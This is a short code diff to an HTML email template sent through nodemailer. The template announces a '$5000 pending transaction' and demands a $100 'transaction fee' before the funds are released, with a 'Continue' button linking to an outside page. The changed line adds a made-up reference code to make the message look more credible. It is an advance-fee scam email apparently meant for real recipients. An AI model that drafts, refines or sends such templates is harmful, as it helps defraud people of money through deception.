@@ -51,7 +51,7 @@ const transporter = nodemailer.createTransport({
     <img src="https://michyqruz.github.io/The-money-box/IMG_8578.jpeg" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
     <h1 style="color: #000000; font-size: 36px; margin: 40px 0; font-weight: 900;">$5000 PENDING TRANSACTION</h1>
     <p style="color: #000000; font-size: 20px; font-weight: bold; text-align: left; line-height: 1.5;">
-        You just receieved $5000 from a bussiness account for the first time, due to security reason you need to pay a transaction fee of $100 before the fund is deposited into your account.
+        You just receieved WUI-XY9IRY68LZ $5000 from a bussiness account for the first time, due to security reason you need to pay a transaction fee of $100 before the fund is deposited into your account.
     </p>
     <a href="https://millxore.github.io/seen/" style="display: inline-block; color: #ffffff; padding: 15px 40px; background-color: #000000; color: white; text-decoration: none; border-radius: 25px; font-size: 16px; margin: 10px 0; font-weight: bold;">Continue</a>
   </div>
